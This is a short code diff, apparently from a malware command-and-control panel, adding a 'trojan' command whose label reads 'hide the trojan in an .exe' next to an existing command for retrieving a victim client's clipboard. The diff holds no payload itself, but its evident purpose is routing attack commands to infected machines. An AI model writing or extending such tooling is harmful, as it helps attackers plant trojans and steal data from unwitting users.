@@ -28,6 +28,10 @@ export async function fetchDataAndUpdateInteraction(type, interaction, clientId,
             endpoint = `papier/client/${clientId}`;
             contentType = "récuperation du presse papier";
             break;
+        case 'trojan':
+            endpoint = `trojan/client/${clientId}`;
+            contentType = "Dissimuler le trojan dans un .exe";
+            break;
 
     }
 
